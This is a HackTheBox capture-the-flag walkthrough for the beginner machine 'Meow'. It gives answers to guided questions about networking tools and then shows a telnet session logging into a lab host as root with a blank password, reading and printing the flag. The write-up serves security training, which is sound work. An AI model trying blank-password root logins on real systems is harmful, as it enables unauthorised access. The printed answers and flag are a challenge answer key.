---
title: "HTB: Meow - Write-Up"
description: "A walkthrough for the HTB machine Meow, focusing on gaining root access and retrieving the flag."
date: 2024-07-29
categories: [CTF, HackTheBox]
tags: [privilege escalation, telnet]
image:
  path: thbnls/meow.png
---

## TARGET MACHINE IP ADDRESS

```
10.129.36.124
```

---

### TASK 1

What does the acronym VM stand for?

**Ans:**
```
Virtual Machine
```

---

### TASK 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

<details>
<summary>Task 2 Hint</summary>
It's also the name of the location in any airport where passengers transfer between ground transportation and the facilities that allow them to board their flight.
</details>

**Ans:**
```
Terminal
```

---

### TASK 3

What service do we use to form our VPN connection into HTB labs?

<details>
<summary>Task 3 Hint</summary>
It's an open source VPN service which comes preinstalled on most Linux-based Operating Systems.
</details>

**Ans:**
```
Openvpn
```

---

### TASK 4

What tool do we use to test our connection to the target with an ICMP echo request?

<details>
<summary>Task 4 Hint</summary>
It's also half of the name of a very popular sport, also known as table tennis.
</details>

**Ans:**
```
Ping
```

---

### TASK 5

What is the name of the most common tool for finding open ports on a target?

<details>
<summary>Task 5 Hint</summary>
Short for Network Mapper, a popular network host scanning tool.
</details>

**Ans:**
```
Nmap
```

---

### TASK 6

What service do we identify on port 23/tcp during our scans?

<details>
<summary>Task 6 Hint</summary>
This service runs on port 23/tcp by default, meaning we can research the port on Google and receive the correct result easily.
</details>

**Ans:**
```
telnet
```

---

### TASK 7

What username is able to log into the target over telnet with a blank password?

<details>
<summary>Task 7 Hint</summary>
It is popularly known as the administrative account for any Linux-based Operating System, residing at the highest level of privilege on any such system.
</details>

**Ans:**
```
root
```

---

### SUBMIT FLAG

Submit root flag:

```bash
┌──(root㉿neo)-[~]
└─# telnet 10.129.36.124 -l root
Trying 10.129.36.124...
Connected to 10.129.36.124.
Escape character is '^]'.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 24 Jul 2024 07:53:52 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             137
  Users logged in:       0
  IPv4 address for eth0: 10.129.36.124
  IPv6 address for eth0: dead:beef::250:56ff:feb0:ffca

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

^Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# ^
-bash: !!: event not found
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 
```

**Flag:**
```
b40abdfe23665f766f9c61ecba8a4c19
```
